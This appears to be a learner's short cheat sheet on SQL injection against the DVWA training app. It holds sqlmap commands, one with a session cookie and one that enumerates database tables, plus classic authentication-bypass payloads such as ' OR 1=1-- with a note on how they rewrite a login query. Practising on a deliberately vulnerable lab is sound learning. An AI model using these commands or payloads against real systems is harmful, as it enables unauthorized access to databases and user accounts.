# sqlmap 

sqlmap -cookie="security=high; PHPSESSID=a3a6968ac0cb1775f890061af0b42108"" -u “http://192.168.0.6/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#”

//better to sent request trough ZAP proxy save the request somehwere and the to run it with the file:

sqlmap -r "/home/kali/Documents/sqlinj.raw" 

//enumerate all sql tables to get an full reports of them
sqlmap -r "/home/kali/Documents/sqlinj.raw" --tables

# commands
1) Try to only put ' or “ in

//ends wit comment to ignore rest select * from users where email='$email' and password='pw' => tansforms to: slect * from users where email=' ' OR 1=1--' and password='pw' 
2) ' OR 1=1--
3) ' OR 1=1; --